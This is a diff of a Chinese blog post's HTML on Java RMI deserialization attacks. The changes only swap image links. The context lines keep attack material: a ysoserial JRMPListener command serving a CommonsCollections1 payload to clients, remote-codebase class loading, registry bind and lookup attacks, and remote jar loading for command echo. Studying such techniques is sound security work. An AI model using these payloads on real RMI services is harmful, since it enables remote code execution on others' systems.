@@ -282,10 +282,10 @@ python -3 -m http.server 8081 0x04 JEP290绕过 高版本 jdk 引入了 JEP 290 
       
       <h2 id="0x01-rmi-介绍">0x01 RMI 介绍</h2>
 <p>RMI（Rmote Method Invoke）全名远程方法调用。其实就是客户端(Client)可以远程调用服务端(Server)上的方法，JVM虚拟机能够远程调用另一个JVM虚拟机中的方法，但是客户端中并不是直接调用服务器上的方法的，而是会借助存根 (stub) 充当我们客户端的代理，来访问服务端，同时骨架 (Skeleton) 是另一个代理，它与真实对象一起在服务端上，骨架将接受到的请求交给服务器来处理，服务器处理完成之后将结果进行打包发送至存根 ，然后存根将结果进行解包之后的结果发送给客户端</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image.png" alt="image.png"></p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410062220537.png" alt="image.png"></p>
 <h3 id="序列化传输">序列化传输</h3>
 <p>RMI在数据传输中的对象必须要实现java.io.Serializable接口，因为传输过程中都是进行序列化进行传输并且客户端的 serialVersionUID 字段要与服务器端保持一致。下图中的ac ed就是反序列化的标志</p>
-<p><img src="Java%20RMI%E5%8F%8A%E5%85%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%2010756d664e558049a28ae588f879cb5f/image%201.png" alt="image.png"></p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410062220578.png" alt="image.png"></p>
 <h3 id="rmi主要构成部分">RMI主要构成部分</h3>
 <p>RMI的主要由三部分组成</p>
 <ol>
@@ -294,7 +294,7 @@ python -3 -m http.server 8081 0x04 JEP290绕过 高版本 jdk 引入了 JEP 290 
 <li>RMI Client 客户端：客户端通过查询注册表来获取对应名称的对象引用，以及该对象实现的接口</li>
 </ol>
 <p>首先我们的RMI Client 会远程连接RMI Registry（默认端口1099），然后会在Registry 寻找名字为Test的对象 (假设此时客户端要调用Test对象中的某个方法)，Registry会寻找对应名字的远程对象引用，并且序列化后进行返回（数据内容就是远程对象的地址，这里返回的对象就是前文提到的存根stub），客户端在接受到之后首先会在本机中的classpath进行查找，如果没有找到则说明是远程对象，客户端就会与远程地址进行tcp连接。</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%202.png" alt="image.png"></p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410062220102.png" alt="image.png"></p>
 <h3 id="存根stub和骨架skeleton">存根(Stub)和骨架(Skeleton)</h3>
 <p>当RMI Server 启动的时候端口是被随机分配的，但是我们的RMI Registry端口是知道的</p>
 <ol>
@@ -385,9 +385,9 @@ python -3 -m http.server 8081 0x04 JEP290绕过 高版本 jdk 引入了 JEP 290 
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">res</span><span class="p">);</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
-</span></span></span></code></pre></div><p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%203.png" alt="image.png"></p>
+</span></span></span></code></pre></div><p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410062220847.png" alt="image.png"></p>
 <h3 id="rmi通信wireshark">RMI通信（Wireshark）</h3>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%204.png" alt="image.png"></p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410062220552.png" alt="image.png"></p>
 <p>在整个RMI通信流程中一共会进行两次TCP连接</p>
 <ol>
 <li>第一次会和 Registry:1099 建立一次TCP连接，Registry 返回存根（Stub）</li>
@@ -410,7 +410,7 @@ python -3 -m http.server 8081 0x04 JEP290绕过 高版本 jdk 引入了 JEP 290 
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">java</span><span class="w"> </span><span class="o">-</span><span class="n">Djava</span><span class="p">.</span><span class="na">rmi</span><span class="p">.</span><span class="na">server</span><span class="p">.</span><span class="na">codebase</span><span class="o">=</span><span class="n">http</span><span class="p">:</span><span class="c1">//url:8080/</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="n">或者</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">java</span><span class="w"> </span><span class="o">-</span><span class="n">Djava</span><span class="p">.</span><span class="na">rmi</span><span class="p">.</span><span class="na">server</span><span class="p">.</span><span class="na">codebase</span><span class="o">=</span><span class="n">http</span><span class="p">:</span><span class="c1">//url:8080/xxx.jar</span><span class="w">
-</span></span></span></code></pre></div><p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%205.png" alt="image.png"></p>
+</span></span></span></code></pre></div><p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410062220252.png" alt="image.png"></p>
 <p>同时，也可以在代码中通过<code>System.setProperty()</code>来设置系统属性值</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">System</span><span class="p">.</span><span class="na">setProperty</span><span class="p">(</span><span class="s">&#34;java.rmi.server.codebase&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;http://url:8080/&#34;</span><span class="p">);</span><span class="w">
 </span></span></span></code></pre></div><p>所以官方也注意到了这一个安全隐患，所以只有满足如下条件的RMI服务器才能被攻击：</p>
@@ -641,7 +641,7 @@ python -3 -m http.server 8081 0x04 JEP290绕过 高版本 jdk 引入了 JEP 290 
 </span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">Remote</span><span class="p">.</span><span class="na">class</span><span class="w"> </span><span class="p">},</span><span class="w"> </span><span class="n">handler</span><span class="p">)</span><span class="w">
 </span></span></span></code></pre></div><p>上述代码中创建了一个代理对象，这个代理对象代理了 Remote.class 接口，handler 为我们的handler 对象。当调用这个代理对象的一切方法时，最终都会转到调用 handler 的 invoke 方法。</p>
 <p>而 handler 是 InvocationHandler 对象，所以当 r 被反序列化时，会进入 InvocationHandler 对象的invoke 方法，在其 invoke 方法里，同样会触发 memberValues 的 get 方法，此时的 memberValues 是 proxy_map，其也是一个代理类对象，所以会继续触发 proxy_map 的 invoke 方法，后边的就是cc1的前半段内容了。</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%206.png" alt="image.png"></p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410062221327.png" alt="image.png"></p>
 <p>但是这里相当于是客户端也在127.0.0.1上，所以才能 bind 一个恶意对象；实际在远程是无法进行 bind 的。</p>
 <p><strong>unbind&amp;lookup</strong></p>
 <p>这里只能传入一个String，有两种利用方式：</p>
@@ -761,13 +761,13 @@ python -3 -m http.server 8081 0x04 JEP290绕过 高版本 jdk 引入了 JEP 290 
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
 </span></span></span></code></pre></div><p>看似并没有使用 lookup 方法，实则是通过伪造了 lookup 请求，重要的并不是 lookup 方法，主要是通过这个传输信息，再进入到之前提到的 dispatch 对应的分支进行反序列化。所以这个其实也不算是一种攻击方法，只是一个思路。</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%207.png" alt="image.png"></p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410062221740.png" alt="image.png"></p>
 <h3 id="攻击client端">攻击Client端</h3>
 <p>除了 unbind 和 rebind，其他的都会返回数据给客户端，此时的数据是序列化的数据，所以客户端自然也会反序列化，那么我们只需要伪造注册中心的返回数据，就可以达到攻击客户端的效果。</p>
 <p><strong>注册中心攻击客户端</strong></p>
 <p>这里yso的 JRMPListener 已经做好了，命令如下：</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">java</span><span class="w"> </span><span class="o">-</span><span class="n">cp</span><span class="w"> </span><span class="n">ysoserial</span><span class="o">-</span><span class="n">all</span><span class="p">.</span><span class="na">jar</span><span class="w"> </span><span class="n">ysoserial</span><span class="p">.</span><span class="na">exploit</span><span class="p">.</span><span class="na">JRMPListener</span><span class="w"> </span><span class="n">12345</span><span class="w">  </span><span class="n">CommonsCollections1</span><span class="w"> </span><span class="err">&#39;</span><span class="n">open</span><span class="w">  </span><span class="o">/</span><span class="n">System</span><span class="o">/</span><span class="n">Applications</span><span class="o">/</span><span class="n">Calculator</span><span class="p">.</span><span class="na">app</span><span class="err">&#39;</span><span class="w">
-</span></span></span></code></pre></div><p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%208.png" alt="image.png"></p>
+</span></span></span></code></pre></div><p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410062221919.png" alt="image.png"></p>
 <p><strong>服务端攻击客户端</strong></p>
 <p>服务端攻击客户端，可以分为以下两种情景。</p>
 <ol>
@@ -935,11 +935,11 @@ python -3 -m http.server 8081 0x04 JEP290绕过 高版本 jdk 引入了 JEP 290 
 </span></span></span></code></pre></div><h3 id="带回显攻击">带回显攻击</h3>
 <p>这里说的带回显攻击，指的是攻击注册中心时，注册中心遇到异常会直接把异常发回来，返回给客户端。</p>
 <p>在之前攻击注册中心时采用的方式，我们可以通过 bind、lookup、unbind、rebind 等方式去攻击注册中心，当我们尝试攻击时，命令确实执行了，不过注册中心的错误也会传递到我们的客户端中：</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%209.png" alt="image.png"></p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410062221599.png" alt="image.png"></p>
 <p>注册中心在处理请求时，会调用到 UnicastServerRef#dispatch 来处理请求，然后依次调用到 RegistryImpl_Skel 对象的 dispatch 方法，</p>
 <p>我们看一下注册中心如何处理报错的，UnicastServerRef#dispatch：</p>
 <p>首先是把异常赋值给了var6，之后会获取到当前socket连接到outputstream，然后写入异常，之后通过finally后边的两段代码把数据回传给客户端。</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%2010.png" alt="image.png"></p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410062221290.png" alt="image.png"></p>
 <p>思路：当通过bind方法让注册中心反序列化我们的恶意序列化对象时，即可触发命令执行，通过URLClassLoader的方式加载远程jar，并调用其方法，在方法内抛出错误，错误会传回客户端。</p>
 <p>服务端：</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.Naming</span><span class="p">;</span><span class="w">
@@ -1065,8 +1065,8 @@ python -3 -m http.server 8081 0x04 JEP290绕过 高版本 jdk 引入了 JEP 290 
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
 </span></span></span></code></pre></div><p>用python起一个简易的http服务器</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">python</span><span class="w"> </span><span class="o">-</span><span class="n">3</span><span class="w"> </span><span class="o">-</span><span class="n">m</span><span class="w"> </span><span class="n">http</span><span class="p">.</span><span class="na">server</span><span class="w"> </span><span class="n">8081</span><span class="w">
-</span></span></span></code></pre></div><p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%2011.png" alt="image.png"></p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%2012.png" alt="image.png"></p>
+</span></span></span></code></pre></div><p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410062221002.png" alt="image.png"></p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410062221997.png" alt="image.png"></p>
 <h2 id="0x04-jep290绕过">0x04 JEP290绕过</h2>
 <p>高版本 jdk 引入了 JEP 290 策略, 并在 Client 与 Registry 的通信过程中默认设置了 registryFilter, 使得只有在白名单里面的类才能够被反序列化</p>
 <p>待补充</p>
